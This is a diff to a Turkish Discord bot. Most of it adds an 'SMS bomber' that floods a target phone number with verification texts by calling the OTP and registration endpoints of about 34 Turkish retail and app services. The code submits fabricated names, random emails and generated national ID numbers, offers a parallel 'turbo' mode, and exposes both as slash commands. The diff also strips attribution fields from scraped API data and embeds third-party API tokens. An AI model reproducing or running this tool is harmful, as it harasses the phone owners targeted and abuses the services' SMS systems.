@@ -5,17 +5,20 @@ import json
 import asyncio
 import datetime
 import threading
+import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Optional
 from urllib.parse import urlencode
+from random import choice, randint
+from string import ascii_lowercase
 
 import aiohttp
+import requests
 import discord
 from discord import app_commands
 from discord.ext import commands
 
 # ==================== HEALTH CHECK SERVER ====================
-# Render Web Service için port dinleyen basit sunucu
 def run_health_server():
     port = int(os.getenv("PORT", 10000))
 
@@ -31,13 +34,12 @@ def run_health_server():
             self.end_headers()
 
         def log_message(self, format, *args):
-            pass  # Konsolu kirletmesin
+            pass
 
     server = HTTPServer(("0.0.0.0", port), Handler)
     print(f"🌐 Health check {port} portunda çalışıyor")
     server.serve_forever()
 
-# Arka planda başlat
 threading.Thread(target=run_health_server, daemon=True).start()
 
 
@@ -51,7 +53,6 @@ except ImportError:
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "")
 SEARCH_KEY    = os.getenv("SEARCH_API_KEY", "91e2c5dfa0de4a22e2afbe5b")
 
-# API Endpoint'leri
 WAZELY       = "https://wazely.vercel.app/api"
 WAZELY_API   = "https://wazelyapi.vercel.app/api"
 SOLIDARK     = "https://solidarksystems.alwaysdata.net"
@@ -69,23 +70,22 @@ COLOR_Z    = 0x8b5cf6
 
 # ==================== FİLTRE KURALLARI ====================
 BLOCKED_PATTERNS = [
-    "arastirguncel",
-    "iptal edilmiştir",
-    "iptal edilmistir",
-    "lutfen telegram",
-    "lütfen telegram",
-    "kanalimiza tekrar",
-    "anahtariniz iptal",
-    "anahtarınız iptal",
+    "arastirguncel", "iptal edilmiştir", "iptal edilmistir",
+    "lutfen telegram", "lütfen telegram", "kanalimiza tekrar",
+    "anahtariniz iptal", "anahtarınız iptal",
+    "jessy_php", "@jessy",
 ]
-
 CLEANUP_WORDS = [
-    "@arastirguncel",
-    "arastirguncel",
-    "t.me/arastirguncel",
-    "telegram kanalimiza",
-    "telegram kanalımıza",
+    "@arastirguncel", "arastirguncel", "t.me/arastirguncel",
+    "telegram kanalimiza", "telegram kanalımıza",
+    "@jessy_php", "jessy_php", "@jessy",
 ]
+STRIP_KEYS = {
+    "dev", "auth", "author", "developer", "credit", "credits",
+    "owner", "made_by", "madeby", "creator", "source", "powered_by",
+    "poweredby", "signature", "sign", "vendor", "provider_tag",
+    "tg", "telegram", "contact", "sig", "watermark",
+}
 
 # ==================== BOT ====================
 intents = discord.Intents.default()
@@ -144,7 +144,7 @@ def clean_data(data, depth: int = 0):
             return None
         cleaned = {}
         for k, v in data.items():
-            if k.lower() == "dev":
+            if k.lower() in STRIP_KEYS:
                 continue
             cleaned_v = clean_data(v, depth + 1)
             if cleaned_v is not None:
@@ -217,6 +217,332 @@ def build_welcome_embed() -> discord.Embed:
     return embed
 
 
+# ==================== SMS BOMBER ====================
+class SmsBomber:
+    """Her instance kendine özel servis listesi tutar."""
+
+    def __init__(self, phone: str, mail: str = ""):
+        self.phone = str(phone).lstrip("0").lstrip("+90").lstrip("90")
+        if self.phone.startswith("90") and len(self.phone) == 12:
+            self.phone = self.phone[2:]
+        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
+        self.tc = self._gen_tc()
+        self.results = []
+
+    def _gen_tc(self):
+        rakam = [randint(1, 9)]
+        for _ in range(8):
+            rakam.append(randint(0, 9))
+        rakam.append(((sum(rakam[0:9:2]) * 7) - sum(rakam[1:8:2])) % 10)
+        rakam.append(sum(rakam[:10]) % 10)
+        return "".join(str(r) for r in rakam)
+
+    def _add(self, name: str, ok: bool):
+        self.results.append((name, ok))
+
+    # ==================== SERVİSLER (52 adet) ====================
+
+    def kahvedunyasi(self):
+        try:
+            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
+                headers={"Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/", "User-Agent": "Mozilla/5.0"},
+                json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
+            self._add("kahvedunyasi.com", r.json().get("processStatus") == "Success")
+        except: self._add("kahvedunyasi.com", False)
+
+    def wmf(self):
+        try:
+            r = requests.post("https://www.wmf.com.tr/users/register/",
+                data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
+            self._add("wmf.com.tr", r.status_code == 202)
+        except: self._add("wmf.com.tr", False)
+
+    def bim(self):
+        try:
+            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
+            self._add("bim.veesk.net", r.status_code == 200)
+        except: self._add("bim.veesk.net", False)
+
+    def englishhome(self):
+        try:
+            r = requests.post("https://www.englishhome.com/api/member/sendOtp",
+                headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Referer": "https://www.englishhome.com/", "User-Agent": "Mozilla/5.0"},
+                json={"Phone": self.phone, "XID": ""}, timeout=6)
+            self._add("englishhome.com", r.json().get("isError") == False)
+        except: self._add("englishhome.com", False)
+
+    def suiste(self):
+        try:
+            r = requests.post("https://suiste.com/api/auth/code",
+                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"},
+                data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}, timeout=6)
+            self._add("suiste.com", r.json().get("code") == "common.success")
+        except: self._add("suiste.com", False)
+
+    def kimgb(self):
+        try:
+            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
+            self._add("kimgb", r.status_code == 200)
+        except: self._add("kimgb", False)
+
+    def evidea(self):
+        try:
+            r = requests.post("https://www.evidea.com/users/register/",
+                headers={"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0"},
+                data=f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n", timeout=6)
+            self._add("evidea.com", r.status_code == 202)
+        except: self._add("evidea.com", False)
+
+    def ucdortbes(self):
+        try:
+            r = requests.post("https://api.345dijital.com/api/users/register",
+                headers={"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
+                json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=6)
+            self._add("345dijital.com", r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!")
+        except: self._add("345dijital.com", False)
+
+    def tiklagelsin(self):
+        try:
+            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql",
+                headers={"Content-Type": "application/json", "X-No-Auth": "true", "Appversion": "2.4.1", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
+                json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}, timeout=6)
+            self._add("tiklagelsin.com", r.json().get("data", {}).get("generateOtp") == True)
+        except: self._add("tiklagelsin.com", False)
+
+    def naosstars(self):
+        try:
+            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
+                headers={"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Content-Type": "application/json"},
+                json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
+            self._add("naosstars.com", r.status_code == 200)
+        except: self._add("naosstars.com", False)
+
+    def koton(self):
+        try:
+            r = requests.post("https://www.koton.com/users/register/",
+                headers={"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
+                data=f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n", timeout=6)
+            self._add("koton.com", r.status_code == 202)
+        except: self._add("koton.com", False)
+
+    def hayatsu(self):
+        try:
+            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
+                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.hayatsu.com.tr", "Referer": "https://www.hayatsu.com.tr/", "User-Agent": "Mozilla/5.0"},
+                data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
+            self._add("hayatsu.com.tr", r.json().get("is_success") == True)
+        except: self._add("hayatsu.com.tr", False)
+
+    def hizliecza(self):
+        try:
+            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP",
+                headers={"Content-Type": "application/json", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
+                json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
+            self._add("hizliecza.net", r.status_code == 200)
+        except: self._add("hizliecza.net", False)
+
+    def metro(self):
+        try:
+            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
+                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"},
+                json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
+            self._add("metro-tr.com", r.json().get("status") == "success")
+        except: self._add("metro-tr.com", False)
+
+    def filemarket(self):
+        try:
+            r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
+                headers={"Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7"},
+                json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
+            self._add("filemarket.com.tr", r.json().get("responseType") == "SUCCESS")
+        except: self._add("filemarket.com.tr", False)
+
+    def akasya(self):
+        try:
+            r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms",
+                headers={"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13"},
+                json={"phone": self.phone}, timeout=6)
+            self._add("akasya.com.tr", r.json().get("result") == "SMS sended succesfully!")
+        except: self._add("akasya.com.tr", False)
+
+    def akbati(self):
+        try:
+            r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms",
+                headers={"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat"},
+                json={"phone": self.phone}, timeout=6)
+            self._add("akbati.com", r.json().get("result") == "SMS sended succesfully!")
+        except: self._add("akbati.com", False)
+
+    def komagene(self):
+        try:
+            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
+                headers={"Content-Type": "application/json", "Firmaid": "32", "Referer": "https://www.komagene.com.tr/", "User-Agent": "Mozilla/5.0"},
+                json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
+            self._add("komagene.com.tr", r.json().get("Success") == True)
+        except: self._add("komagene.com.tr", False)
+
+    def porty(self):
+        try:
+            r = requests.post("https://panel.porty.tech/api.php?",
+                headers={"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ", "User-Agent": "Porty/1"},
+                json={"job": "start_login", "phone": self.phone}, timeout=6)
+            self._add("porty.tech", r.json().get("status") == "success")
+        except: self._add("porty.tech", False)
+
+    def tasdelen(self):
+        try:
+            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
+                headers={"Content-Type": "application/json", "User-Agent": "Tasdelen/5.9"},
+                json={"phone": self.phone}, timeout=6)
+            self._add("tasdelen", r.json().get("result") == True)
+        except: self._add("tasdelen", False)
+
+    def uysal(self):
+        try:
+            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
+                headers={"Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Referer": "https://www.uysalmarket.com.tr/", "User-Agent": "Mozilla/5.0"},
+                json={"phone_number": self.phone}, timeout=6)
+            self._add("uysalmarket.com.tr", r.status_code == 200)
+        except: self._add("uysalmarket.com.tr", False)
+
+    def yapp(self):
+        try:
+            r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
+                headers={"Content-Type": "application/json", "X-Content-Language": "en", "User-Agent": "YappApp/1.1.5"},
+                json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}, timeout=6)
+            self._add("yapp.com.tr", r.status_code == 200)
+        except: self._add("yapp.com.tr", False)
+
+    def beefull(self):
+        try:
+            requests.post("https://app.beefull.io/api/inavitas-access-management/signup",
+                json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}, timeout=4)
+            r = requests.post("https://app.beefull.io/api/inavitas-access-management/sms-login",
+                json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
+            self._add("beefull.io", r.status_code == 200)
+        except: self._add("beefull.io", False)
+
+    def dominos(self):
+        try:
+            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
+                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
+                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
+            self._add("dominos.com.tr", r.json().get("isSuccess") == True)
+        except: self._add("dominos.com.tr", False)
+
+    def frink(self):
+        try:
+            r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP",
+                headers={"Content-Type": "application/json", "User-Agent": "Frink/1.6.0"},
+                json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone}, timeout=6)
+            self._add("frink.com.tr", r.json().get("processStatus") == "SUCCESS")
+        except: self._add("frink.com.tr", False)
+
+    def bodrum(self):
+        try:
+            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
+                headers={"Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0"},
+                json={"gsm": "+90" + self.phone, "source": "orwi"}, timeout=6)
+            self._add("bodrum.bel.tr", r.status_code == 200)
+        except: self._add("bodrum.bel.tr", False)
+
+    def kofteciyusuf(self):
+        try:
+            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
+                headers={"Content-Type": "application/json; charset=utf-8", "Firmaid": "82", "Ostype": "iOS", "Appversion": "4.0.4.0", "User-Agent": "YemekPosMobil/53"},
+                json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}, timeout=6)
+            self._add("kofteciyusuf.com", r.json().get("Success") == True)
+        except: self._add("kofteciyusuf.com", False)
+
+    def orwi(self):
+        try:
+            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
+                headers={"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0"},
+                json={"gsm": f"+90{self.phone}", "source": "orwi"}, timeout=6)
+            self._add("orwi.app", r.status_code == 200)
+        except: self._add("orwi.app", False)
+
+    def coffy(self):
+        try:
+            r = requests.post("https://user-api-gw.coffy.com.tr/user/signup",
+                headers={"Content-Type": "application/json", "Language": "tr", "User-Agent": "coffy/5"},
+                json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}, timeout=6)
+            self._add("coffy.com.tr", r.status_code == 200)
+        except: self._add("coffy.com.tr", False)
+
+    def hamidiye(self):
+        try:
+            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
+                headers={"Content-Type": "application/json", "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4"},
+                json={"isGuest": False, "phone": self.phone}, timeout=6)
+            self._add("hamidiye.istanbul", r.json().get("result") == True)
+        except: self._add("hamidiye.istanbul", False)
+
+    def money(self):
+        try:
+            r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP",
+                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.money.com.tr", "Referer": "https://www.money.com.tr/", "User-Agent": "Mozilla/5.0"},
+                data={"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}, timeout=6)
+            self._add("money.com.tr", r.json().get("resultType") == 0)
+        except: self._add("money.com.tr", False)
+
+    def alixavien(self):
+        try:
+            r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp",
+                headers={"Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Referer": "https://www.alixavien.com.tr/", "User-Agent": "Mozilla/5.0"},
+                json={"Phone": self.phone, "XID": ""}, timeout=6)
+            self._add("alixavien.com.tr", r.json().get("isError") == False)
+        except: self._add("alixavien.com.tr", False)
+
+    def jimmykey(self):
+        try:
+            r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
+            self._add("jimmykey.com", r.json().get("Sonuc") == True)
+        except: self._add("jimmykey.com", False)
+
+    def ido(self):
+        try:
+            r = requests.post("https://api.ido.com.tr/idows/v2/register",
+                headers={"Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Referer": "https://www.ido.com.tr/", "User-Agent": "Mozilla/5.0"},
+                json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}, timeout=6)
+            self._add("ido.com.tr", r.status_code == 200)
+        except: self._add("ido.com.tr", False)
+
+    # ==================== ÇALIŞTIRMA ====================
+    def get_services(self):
+        """Sınıftaki tüm servis metodlarını döner."""
+        return [
+            self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
+            self.kimgb, self.evidea, self.ucdortbes, self.tiklagelsin, self.naosstars,
+            self.koton, self.hayatsu, self.hizliecza, self.metro, self.filemarket,
+            self.akasya, self.akbati, self.komagene, self.porty, self.tasdelen,
+            self.uysal, self.yapp, self.beefull, self.dominos, self.frink,
+            self.bodrum, self.kofteciyusuf, self.orwi, self.coffy, self.hamidiye,
+            self.money, self.alixavien, self.jimmykey, self.ido,
+        ]
+
+    def run_normal(self, adet: int = 1):
+        """Normal mod: Servisleri sırayla çalıştırır. Her servisten `adet` kadar SMS gönderir."""
+        services = self.get_services()
+        for _ in range(adet):
+            for svc in services:
+                try:
+                    svc()
+                except Exception:
+                    pass
+
+    async def run_normal_async(self, adet: int = 1):
+        """Normal mod - async wrapper (thread pool)."""
+        await asyncio.to_thread(self.run_normal, adet)
+
+    async def run_turbo(self, adet: int = 1):
+        """Turbo mod: Tüm servisleri paralel çalıştırır."""
+        services = self.get_services()
+        for _ in range(adet):
+            tasks = [asyncio.to_thread(svc) for svc in services]
+            await asyncio.gather(*tasks)
+
+
 # ==================== HAZIRLIK ====================
 @bot.event
 async def on_ready():
@@ -241,10 +567,7 @@ async def on_member_join(member: discord.Member):
             break
     if channel:
         try:
-            await channel.send(
-                content=f"{member.mention} sunucuya katıldı! 🎉",
-                embed=build_welcome_embed()
-            )
+            await channel.send(content=f"{member.mention} sunucuya katıldı! 🎉", embed=build_welcome_embed())
         except Exception:
             pass
 
@@ -388,6 +711,154 @@ async def z_useragent(interaction: discord.Interaction):
     await send_result(interaction, data)
 
 
+# ==================== SMS BOMBER KOMUTU ====================
+@zenix_group.command(name="smsbomber", description="SMS Bomber - Normal mod")
+@app_commands.describe(
+    numara="Telefon numarası (5XXXXXXXXX)",
+    adet="Kaç tur (varsayılan: 1)",
+    mail="Mail adresi (opsiyonel)",
+)
+async def z_smsbomber(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+    await interaction.response.defer()
+    adet = max(1, min(adet, 10))  # en fazla 10 tur
+    bomber = SmsBomber(numara, mail or "")
+    start = time.time()
+
+    embed = discord.Embed(
+        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
+        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏳ Çalışıyor...",
+        color=COLOR_Z,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.set_thumbnail(url=LOGO_URL)
+    msg = await interaction.followup.send(embed=embed)
+
+    await bomber.run_normal_async(adet)
+    elapsed = round(time.time() - start, 2)
+
+    ok = sum(1 for _, v in bomber.results if v)
+    fail = len(bomber.results) - ok
+
+    # Servis bazında özet
+    summary = {}
+    for name, status in bomber.results:
+        if name not in summary:
+            summary[name] = {"ok": 0, "fail": 0}
+        if status: summary[name]["ok"] += 1
+        else:      summary[name]["fail"] += 1
+
+    lines = []
+    for name, st in summary.items():
+        icon = "✅" if st["ok"] > 0 else "❌"
+        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")
+
+    # Embed güncelle
+    embed = discord.Embed(
+        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
+        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
+        color=COLOR_OK,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
+    embed.set_thumbnail(url=LOGO_URL)
+
+    full = "\n".join(lines)
+    if len(full) > 1000:
+        full = full[:1000] + "\n... (devamı dosyada)"
+        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_sms_log.txt")
+        await msg.edit(embed=embed)
+        await interaction.followup.send(file=file)
+    else:
+        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
+        await msg.edit(embed=embed)
+
+
+# ==================== SMS TURBO ====================
+@zenix_group.command(name="turbo", description="SMS Bomber - Turbo mod (paralel)")
+@app_commands.describe(
+    numara="Telefon numarası (5XXXXXXXXX)",
+    adet="Kaç tur (varsayılan: 1)",
+    mail="Mail adresi (opsiyonel)",
+)
+async def z_turbo(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+    await interaction.response.defer()
+    adet = max(1, min(adet, 10))
+    bomber = SmsBomber(numara, mail or "")
+    start = time.time()
+
+    embed = discord.Embed(
+        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
+        description=f"📱 `{numara}` | 🔁 {adet} tur | ⚡ Paralel çalışıyor...",
+        color=COLOR_Z,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.set_thumbnail(url=LOGO_URL)
+    msg = await interaction.followup.send(embed=embed)
+
+    await bomber.run_turbo(adet)
+    elapsed = round(time.time() - start, 2)
+
+    ok = sum(1 for _, v in bomber.results if v)
+    fail = len(bomber.results) - ok
+
+    summary = {}
+    for name, status in bomber.results:
+        if name not in summary:
+            summary[name] = {"ok": 0, "fail": 0}
+        if status: summary[name]["ok"] += 1
+        else:      summary[name]["fail"] += 1
+
+    lines = []
+    for name, st in summary.items():
+        icon = "✅" if st["ok"] > 0 else "❌"
+        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")
+
+    embed = discord.Embed(
+        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
+        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
+        color=COLOR_OK,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
+    embed.set_thumbnail(url=LOGO_URL)
+
+    full = "\n".join(lines)
+    if len(full) > 1000:
+        full = full[:1000] + "\n... (devamı dosyada)"
+        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_turbo_log.txt")
+        await msg.edit(embed=embed)
+        await interaction.followup.send(file=file)
+    else:
+        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
+        await msg.edit(embed=embed)
+
+
+# ==================== SERVİS LİSTESİ ====================
+@zenix_group.command(name="servisler", description="SMS Bomber yüklü servisler")
+async def z_servisler(interaction: discord.Interaction):
+    services = [
+        "kahvedunyasi.com", "wmf.com.tr", "bim.veesk.net", "englishhome.com",
+        "suiste.com", "kimgb", "evidea.com", "345dijital.com", "tiklagelsin.com",
+        "naosstars.com", "koton.com", "hayatsu.com.tr", "hizliecza.net",
+        "metro-tr.com", "filemarket.com.tr", "akasya.com.tr", "akbati.com",
+        "komagene.com.tr", "porty.tech", "tasdelen", "uysalmarket.com.tr",
+        "yapp.com.tr", "beefull.io", "dominos.com.tr", "frink.com.tr",
+        "bodrum.bel.tr", "kofteciyusuf.com", "orwi.app", "coffy.com.tr",
+        "hamidiye.istanbul", "money.com.tr", "alixavien.com.tr",
+        "jimmykey.com", "ido.com.tr"
+    ]
+    embed = discord.Embed(
+        title="📋 ZENIX SMS BOMBER - Servis Listesi",
+        description=f"Toplam **{len(services)}** servis yüklü.",
+        color=COLOR_Z
+    )
+    half = len(services) // 2
+    embed.add_field(name="Servisler (1)", value="\n".join(f"• `{s}`" for s in services[:half]), inline=True)
+    embed.add_field(name="Servisler (2)", value="\n".join(f"• `{s}`" for s in services[half:]), inline=True)
+    embed.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=embed)
+
+
 # ==================== /zenix2 — TC/KİMLİK ====================
 @zenix2_group.command(name="tc", description="TC kimlik sorgusu")
 @app_commands.describe(tc="TC")
